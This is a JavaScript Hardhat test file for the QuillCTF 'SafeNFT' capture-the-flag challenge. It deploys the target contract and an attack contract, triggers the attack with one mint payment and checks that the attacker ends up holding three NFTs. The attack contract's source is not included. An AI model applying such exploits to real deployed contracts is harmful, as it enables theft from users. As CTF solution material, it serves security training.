const { expect } = require("chai");
const { ethers } = require("hardhat");
const {
  loadFixture,
} = require("@nomicfoundation/hardhat-toolbox/network-helpers");

describe("QuillCTF 7: SafeNFT", function () {
  let contract;
  let owner;
  let attacker;

  let contractAddress;
  
  let count = 3;
  let price = ethers.parseEther("0.01");
  
  async function runEveryTime() {
    [owner, attacker] = await ethers.getSigners();
    // console.log(owner, attacker);

    const Contract = await ethers.getContractFactory("SafeNFT", owner);
    contract = await Contract.deploy("Prasoon", "PP", price);
    await contract.waitForDeployment();

    contractAddress = await contract.getAddress();
    // console.log(owner, attacker, contract);
    // console.log(owner.address, attacker.address, contractAddress);
    return { owner, attacker, contract, contractAddress };
  }

  it("should claim multiple NFTs", async () => {
    const { owner, attacker, contract } = await loadFixture(runEveryTime);
    // console.log(owner.address, attacker.address, contractAddress);

    const AttackContract = await ethers.getContractFactory("SafeNFTAttack", attacker);
    const attackContract = await AttackContract.deploy(count, contractAddress);
    await attackContract.waitForDeployment();
    const attackContractAddress = await attackContract.getAddress();
    // console.log(attackContractAddress);

    await attackContract.connect(attacker).attack({value: price});

  });

  after(async () => {
    // console.log("Total NFTs claimed:", await contract.balanceOf(attacker.address));
    expect(await contract.balanceOf(attacker.address)).to.be.equal(count);
  });
});